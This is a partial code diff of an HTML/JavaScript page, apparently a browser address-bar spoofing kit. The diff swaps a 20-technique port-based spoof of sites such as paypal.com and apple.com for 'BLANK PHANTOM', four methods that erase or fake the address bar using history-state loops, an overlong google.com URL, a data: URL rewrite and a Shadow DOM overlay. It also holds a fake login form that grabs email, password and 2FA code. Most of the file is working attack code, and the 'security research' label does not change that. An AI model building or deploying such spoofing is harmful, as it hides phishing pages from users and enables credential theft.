+                    showNotification(`Error: ${e.message}`, true);
+                }
+            }, 100);
+        } else {
+            updateStatus("Popup blocked! Please allow popups.", false);
+            showNotification("⚠️ Popup blocked — please allow popups for this site", true);
         }
-        runNext();
     }
     
     // ============================================================
-    // Generate Cards Dynamically
+    // TECHNIQUE 2: CSI Overflow → Address Bar Crash/Erasure
+    // Memanfaatkan https://www.google.com/csi? panjang sampai overflow
     // ============================================================
-    const exploitsConfig = [
-        { port: "8080", name: "HTTP Proxy Port", desc: "Spoof google.com:8080 — Open redirect via port confusion", fn: exploitPort8080 },
-        { port: "3000", name: "React/Node Dev Server", desc: "Spoof paypal.com:3000 — Development server impersonation", fn: exploitPort3000 },
-        { port: "8443", name: "Alternative HTTPS", desc: "Spoof apple.com:8443 — Alt SSL port spoof", fn: exploitPort8443 },
-        { port: "5000", name: "Flask Default", desc: "Spoof github.com:5000 — Python Flask dev server", fn: exploitPort5000 },
-        { port: "8000", name: "Python HTTP Server", desc: "Spoof microsoft.com:8000 — Python SimpleHTTPServer", fn: exploitPort8000 },
-        { port: "4200", name: "Angular CLI", desc: "Spoof angular.io:4200 — Angular dev server", fn: exploitPort4200 },
-        { port: "5173", name: "Vite", desc: "Spoof vitejs.dev:5173 — Modern frontend dev server", fn: exploitPort5173 },
-        { port: "5432", name: "PostgreSQL", desc: "Spoof aws.amazon.com:5432 — Database port confusion", fn: exploitPort5432 },
-        { port: "27017", name: "MongoDB", desc: "Spoof mongodb.com:27017 — NoSQL port spoof", fn: exploitPort27017 },
-        { port: "6379", name: "Redis", desc: "Spoof redis.io:6379 — Cache DB port", fn: exploitPort6379 },
-        { port: "MULTI", name: "Port Rotation", desc: "Rotate through 7+ ports continuously", fn: exploitMultiPort },
-        { port: "WSS", name: "WebSocket", desc: "Spoof wss://echo.websocket.org:443", fn: exploitWebSocketPort },
-        { port: "21", name: "FTP", desc: "Spoof ftp://ftp.microsoft.com:21", fn: exploitFTPPort },
-        { port: "587", name: "SMTP", desc: "Spoof mailto:admin@google.com:587", fn: exploitMailtoPort },
-        { port: "IPv6", name: "IPv6 + Port", desc: "Spoof https://[::1]:8080", fn: exploitIPv6Port },
-        { port: "10000", name: "Webmin", desc: "Spoof cpanel.net:10000 — Webmin default", fn: exploitPort10000 },
-        { port: "3306", name: "MySQL", desc: "Spoof mysql.com:3306 — Database port", fn: exploitPort3306 },
-        { port: "9200", name: "Elasticsearch", desc: "Spoof elastic.co:9200 — Search engine", fn: exploitPort9200 },
-        { port: "15672", name: "RabbitMQ", desc: "Spoof rabbitmq.com:15672 — Message queue", fn: exploitPort15672 },
-        { port: "9090", name: "Prometheus", desc: "Spoof prometheus.io:9090 — Monitoring", fn: exploitPort9090 }
-    ];
-    
-    function buildGrid() {
-        const grid = document.getElementById('exploitGrid');
-        grid.innerHTML = '';
+    function exploitBlank2() {
+        cleanup();
+        updateStatus("[BLANK #2] CSI Overflow → Address bar erasure...", true);
         
-        exploitsConfig.forEach((exp, idx) => {
-            const card = document.createElement('div');
-            card.className = 'card';
-            card.innerHTML = `
-                <div class="card-header">
-                    <span class="port-number">🔌 ${exp.port}</span>
-                    <span class="technique-name">${exp.name}</span>
-                </div>
-                <div class="card-body">
-                    <div class="description">${exp.desc}</div>
-                    <div class="btn-group">
-                        <button class="btn btn-primary" onclick="window['exp_${idx}']()">🚀 SPOOF NOW</button>
-                        <button class="btn btn-secondary" onclick="window.resetSingle()">🔄 RESET</button>
-                    </div>
-                    <div class="code-snippet">
-                        // history.pushState spoof to port ${exp.port}<br>
-                        history.pushState({}, '', 'https://target.com:${exp.port}');
-                    </div>
-                    <div class="status" id="status-${idx}">⚡ Click SPOOF to test</div>
-                </div>
-            `;
-            grid.appendChild(card);
-            window[`exp_${idx}`] = exp.fn;
-        });
+        // Buat URL CSI super panjang
+        const longCSI = 'https://www.google.com/csi?' + 'x'.repeat(50000) + '&v=3&s=news&action=scrolling';
+        
+        // Step 1: Navigate ke long CSI
+        history.pushState({}, '', longCSI);
+        
+        // Step 2: Setelah beberapa ms, overwrite dengan string kosong
+        setTimeout(() => {
+            try {
+                history.replaceState({}, '', '');
+                history.pushState({}, '', '');
+                
+                // Lock empty state
+                activeInterval = setInterval(() => {
+                    if (window.location.href !== '' && window.location.href !== 'about:blank') {
+                        history.replaceState({}, '', '');
+                    }
+                }, 30);
+                
+                updateStatus("[SUCCESS] CSI overflow caused address bar to go EMPTY!", true);
+                showNotification("🌀 Long CSI parameter caused address bar erasure!");
+                updateUrlDisplay();
+                
+            } catch(e) {
+                // Fallback: coba lagi
+                try {
+                    history.replaceState({}, '', ' ');
+                    updateStatus("Partial success: address bar shows space", true);
+                } catch(e2) {}
+            }
+        }, 100);
+        
+        // Juga override title
+        document.title = "";
     }
     
-    window.resetSingle = cleanup;
-    window.resetAll = cleanup;
+    // ============================================================
+    // TECHNIQUE 3: Double Navigation Erasure
+    // Kombinasi about:blank + data:text/html + replaceState
+    // ============================================================
+    function exploitBlank3() {
+        cleanup();
+        updateStatus("[BLANK #3] Double navigation erasure...", true);
+        
+        const currentHTML = document.documentElement.outerHTML;
+        
+        // Step 1: Navigate ke data:text/html kosong
+        const emptyDataUrl = 'data:text/html,<!DOCTYPE html><html><head><title></title></head><body></body></html>';
+        
+        const win = window.open(emptyDataUrl, "_self");
+        
+        if (win) {
+            setTimeout(() => {
+                // Step 2: Write konten asli
+                win.document.open();
+                win.document.write(currentHTML);
+                win.document.close();
+                
+                // Step 3: Replace ke empty string MULTIPLE TIMES
+                setTimeout(() => {
+                    try {
+                        for(let i = 0; i < 10; i++) {
+                            win.history.replaceState({}, '', '');
+                            win.history.pushState({}, '', '');
+                        }
+                        
+                        activeInterval = setInterval(() => {
+                            if (win.location.href !== '') {
+                                win.history.replaceState({}, '', '');
+                            }
+                        }, 30);
+                        
+                        updateStatus("[SUCCESS] Double navigation erased address bar completely!", true);
+                        showNotification("💀 Address bar: COMPLETELY EMPTY after double navigation");
+                        updateUrlDisplay();
+                        
+                    } catch(e) {
+                        updateStatus(`Error: ${e.message}`, false);
+                    }
+                }, 100);
+            }, 50);
+        } else {
+            updateStatus("Navigation failed", false);
+        }
+    }
     
-    document.getElementById('globalReset').addEventListener('click', cleanup);
-    document.getElementById('globalRunAll').addEventListener('click', runAllExploits);
-    document.getElementById('globalStatus').addEventListener('click', () => {
-        showToast(`Active intervals: ${activeIntervals.length} | Windows: ${activeWindows.length}`);
+    // ============================================================
+    // TECHNIQUE 4: Shadow DOM + Null URL Injection
+    // Shadow DOM overlay dengan fake bar kosong + real bar empty
+    // ============================================================
+    function exploitBlank4() {
+        cleanup();
+        updateStatus("[BLANK #4] Shadow DOM + Null URL...", true);
+        
+        // Buat address bar asli jadi kosong
+        history.pushState({}, '', '');
+        
+        // Lock
+        activeInterval = setInterval(() => {
+            if (window.location.href !== '') {
+                history.replaceState({}, '', '');
+            }
+        }, 30);
+        
+        // Buat Shadow DOM dengan fake empty address bar
+        const host = document.createElement('div');
+        host.setAttribute('data-phantom', 'true');
+        host.style.cssText = `
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 44px;
+            z-index: 2147483647;
+            pointer-events: none;
+        `;
+        document.body.appendChild(host);
+        
+        const shadow = host.attachShadow({ mode: 'open' });
+        shadow.innerHTML = `
+            <style>
+                .fake-bar {
+                    background: #1c1c2e;
+                    height: 44px;
+                    width: 100%;
+                    display: flex;
+                    align-items: center;
+                    padding: 0 16px;
+                    border-bottom: 1px solid #333;
+                }
+                .fake-url {
+                    flex: 1;
+                    background: #0a0a0f;
+                    height: 30px;
+                    border-radius: 8px;
+                    margin: 0 12px;
+                }
+                .fake-url-empty {
+                    width: 100%;
+                    height: 100%;
+                    background: transparent;
+                }
+            </style>
+            <div class="fake-bar">
+                <div style="width: 60px;"></div>
+                <div class="fake-url">
+                    <div class="fake-url-empty"></div>
+                </div>
+                <div style="width: 60px;"></div>
+            </div>
+        `;
+        
+        // Juga set title kosong
+        document.title = "";
+        
+        updateStatus("[SUCCESS] Shadow DOM overlay + Empty address bar active!", true);
+        showNotification("🎭 Address bar empty + fake transparent bar overlay");
+        updateUrlDisplay();
+    }
+    
+    // ============================================================
+    // RESET FUNCTION
+    // ============================================================
+    function resetAll() {
+        cleanup();
+        showNotification("✅ Address bar restored to normal");
+        document.title = "BLANK PHANTOM - Security Research";
+        
+        // Remove shadow host
+        const shadowHost = document.querySelector('[data-phantom]');
+        if (shadowHost) shadowHost.remove();
+    }
+    
+    // ============================================================
+    // FAKE LOGIN HANDLER (Demo only)
+    // ============================================================
+    document.getElementById('fakeLoginBtn').addEventListener('click', (e) => {
+        e.preventDefault();
+        const email = document.getElementById('emailField').value;
+        const pass = document.getElementById('passField').value;
+        const code = document.getElementById('codeField').value;
+        
+        if (email || pass) {
+            showNotification(`[DEMO] Credentials captured for research: ${email}`, false);
+            console.log(`[DEMO] Email: ${email}, Pass: ${pass}, 2FA: ${code}`);
+            
+            // Clear fields
+            document.getElementById('emailField').value = '';
+            document.getElementById('passField').value = '';
+            document.getElementById('codeField').value = '';
+        }
     });
     
-    buildGrid();
-    updateGlobalStatus("Ready | 20 port-based exploits available", false);
+    // ============================================================
+    // EVENT LISTENERS
+    // ============================================================
+    document.getElementById('exploitBlank1').addEventListener('click', exploitBlank1);
+    document.getElementById('exploitBlank2').addEventListener('click', exploitBlank2);
+    document.getElementById('exploitBlank3').addEventListener('click', exploitBlank3);
+    document.getElementById('exploitBlank4').addEventListener('click', exploitBlank4);
+    document.getElementById('resetAll').addEventListener('click', resetAll);
     
-    console.log('%c🔥 PORTSPOOF v2.0 LOADED', 'color: #ff6b6b; font-size: 14px;');
-    console.log('20 Port-Based Address Bar Spoofing Techniques');
-    console.log('Ports: 21, 3000, 3306, 4200, 5000, 5173, 5432, 587, 6379, 8000, 8080, 8443, 9090, 9200, 10000, 15672, 27017, plus WSS, FTP, MAILTO, IPv6');
+    // Initial status
+    updateStatus("Ready | 4 blank techniques available", false);
+    
+    console.log('%c🔥 BLANK PHANTOM v1.0 - Zero-Text Address Bar Exploit', 'color: #ff6b6b; font-size: 14px; font-weight: bold;');
     console.log('');
-    console.log('Target browsers: Arc, Chrome, Safari, Dia, Brave, Edge, Orion (macOS)');
+    console.log('4 TEKNIK MEMBUAT ADDRESS BAR KOSONG TOTAL:');
+    console.log('  1. about:blank → NULL Conversion');
+    console.log('  2. CSI Overflow (https://www.google.com/csi? + 50000 chars)');
+    console.log('  3. Double Navigation Erasure');
+    console.log('  4. Shadow DOM + Null URL Injection');
+    console.log('');
+    console.log('⚠️ Hasil: Address bar benar-benar KOSONG, bukan about:blank, bukan spasi');
 </script>
 </body>
 </html>
